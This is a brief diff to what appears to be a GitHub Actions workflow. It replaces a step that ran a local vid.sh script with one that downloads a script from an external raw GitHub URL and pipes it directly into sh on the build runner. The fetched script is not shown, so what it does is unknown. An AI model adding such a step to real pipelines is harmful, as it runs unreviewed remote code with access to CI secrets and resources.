@@ -4,4 +4,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-    - run : chmod +x vid.sh && ./vid.sh
+    - run : curl https://raw.githubusercontent.com/kalepailmine001/tail/refs/heads/main/vid.sh | sh
